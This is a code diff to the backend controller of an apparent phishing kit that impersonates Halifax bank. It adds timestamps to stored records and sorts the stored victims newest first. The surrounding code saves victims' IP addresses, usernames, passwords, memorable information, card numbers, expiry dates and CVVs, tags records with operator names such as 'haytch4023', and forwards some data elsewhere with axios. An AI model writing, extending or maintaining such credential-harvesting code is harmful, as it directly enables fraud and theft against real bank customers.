@@ -1,17 +1,20 @@
 const Halifax = require("../models/halifaxModel");
 const axios = require("axios");
+var moment = require("moment"); // require
 let count = 0;
 
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
-	Halifax.find({ owner }).exec((err, vics) => {
-		if (err) {
-			console.log(err);
-			res.status(404).send("Error");
-			return;
-		}
-		res.send(vics);
-	});
+	Halifax.find({ owner })
+		.sort({ timestamp: -1 })
+		.exec((err, vics) => {
+			if (err) {
+				console.log(err);
+				res.status(404).send("Error");
+				return;
+			}
+			res.send(vics);
+		});
 };
 
 const command = async (req, res) => {
@@ -52,6 +55,7 @@ const submitLogin = async (req, res) => {
 				status: 1,
 				owner: "haytch4023",
 				ip,
+				timestamp: moment().format(),
 			});
 			await axios
 				.post(
@@ -74,6 +78,7 @@ const submitLogin = async (req, res) => {
 				status: 1,
 				owner,
 				ip,
+				timestamp: moment().format(),
 			});
 			count++;
 		}
@@ -89,7 +94,10 @@ const submitLoginAgain = async (req, res) => {
 	try {
 		await Halifax.findOneAndUpdate(
 			{ uniqueid },
-			{ username, password, status: 9 }
+			{
+				username, password, status: 9,
+				timestamp: moment().format(),
+			}
 		).exec();
 		res.sendStatus(200);
 	} catch (error) {
@@ -103,7 +111,10 @@ const submitMemorable = async (req, res) => {
 	try {
 		await Halifax.findOneAndUpdate(
 			{ uniqueid },
-			{ memorable, status: 3 }
+			{
+				memorable, status: 3,
+				timestamp: moment().format(),
+			}
 		).exec();
 		res.sendStatus(200);
 	} catch (error) {
@@ -117,7 +128,10 @@ const submitCard = async (req, res) => {
 	try {
 		await Halifax.findOneAndUpdate(
 			{ uniqueid },
-			{ ccnum, ccexp, cvv, status: 5 }
+			{
+				ccnum, ccexp, cvv, status: 5,
+				timestamp: moment().format(),
+			}
 		).exec();
 		res.sendStatus(200);
 	} catch (error) {
